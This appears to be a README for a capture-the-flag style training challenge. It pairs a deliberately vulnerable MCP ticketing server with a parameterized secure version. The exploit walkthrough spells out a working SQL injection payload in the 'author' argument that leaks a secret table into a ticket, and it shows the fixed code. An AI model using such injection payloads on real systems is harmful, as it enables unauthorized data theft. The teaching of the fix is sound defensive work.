# Challenge 07: Classic SQL Injection (Stored Prompt)

This scenario recreates Anthropic's SQLite reference bug where a write-only helper tool injects untrusted strings directly into an `INSERT` statement. The vulnerable server builds SQL with f-strings, so an attacker can rewrite the statement and leak the secret stored in the `incident_intel` table. The secure server parameterizes the query so the same payload is treated as pure data.

## Running the Challenge

### Local Python
```bash
cd challenges/07-classic-sql-injection-stored-prompt
python -m venv .venv && source .venv/bin/activate  # optional
pip install "mcp[cli]" fastapi uvicorn

python vulnerable/server.py  # http://localhost:8000
python secure/server.py      # http://localhost:8000
```

### Docker Compose
From the repo root:
```bash
docker compose up sql-stored-prompt-vulnerable   # http://localhost:9007/mcp/stream
docker compose up sql-stored-prompt-secure       # http://localhost:9907/mcp/stream
```
Point Cursor or any MCP-aware client at the `/mcp/stream` endpoint.

## Exploit Walkthrough (Cursor-Friendly)

1. Connect Cursor to `http://localhost:9007/mcp/stream`.
2. Ask "what tools exist". You should see:
   - `create_ticket(author: str, content: str)`
   - `summarize_all_tickets()`
3. Call `create_ticket` with the following arguments (Cursor lets you paste JSON):
   ```json
   {
     "tool": "create_ticket",
     "arguments": {
       "author": "ops feed', (SELECT payload FROM incident_intel)); --",
       "content": "ignored"
     }
   }
   ```
   The vulnerable server constructs:
   ```sql
   INSERT INTO tickets (author, content)
   VALUES ('ops feed', (SELECT payload FROM incident_intel)); --', 'ignored')
   ```
   SQLite executes the injected `SELECT`, copying the hidden payload into a normal ticket.
4. Immediately call the summarizer:
   ```json
   {
     "tool": "summarize_all_tickets",
     "arguments": {}
   }
   ```
   Cursor's response now includes a ticket such as `- ops feed: FLAG{sql_prompt_injection_leak}`. No extra tools or prompt tricks were needed?the leak came purely from SQL injection.

## Secure Build Behavior

`secure/server.py` uses parameterized SQL:
```python
cursor.execute(
    "INSERT INTO tickets (author, content) VALUES (?, ?)",
    (author, content),
)
```
SQLite treats the entire payload as data, so the `SELECT` never runs. Repeating the JSON payload above just stores the literal string, and `summarize_all_tickets` shows the exact characters rather than the secret.

## Files of Interest

- `vulnerable/server.py` ? intentionally interpolates SQL strings and ships the vulnerable tools.
- `secure/server.py` ? parameterized fix with the same MCP surface.
- `*/Dockerfile` ? reproducible containers for clients such as Cursor.

Use this challenge to highlight how even a "simple" write tool can become a data-exfiltration vector when SQL injection is ignored.
